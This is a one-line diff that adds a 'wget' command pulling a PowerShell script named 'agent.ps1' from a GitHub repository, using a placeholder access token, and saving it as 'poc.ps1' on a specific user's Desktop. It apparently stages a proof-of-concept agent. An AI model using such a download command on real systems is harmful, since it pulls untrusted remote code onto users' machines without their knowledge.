@@ -1,0 +1,1 @@
+wget "https://api.github.com/repos/anujkrr333/testagent/contents/agent.ps1?access_token=asdf" -outfile C:\Users\akumar24\Desktop\poc.ps1
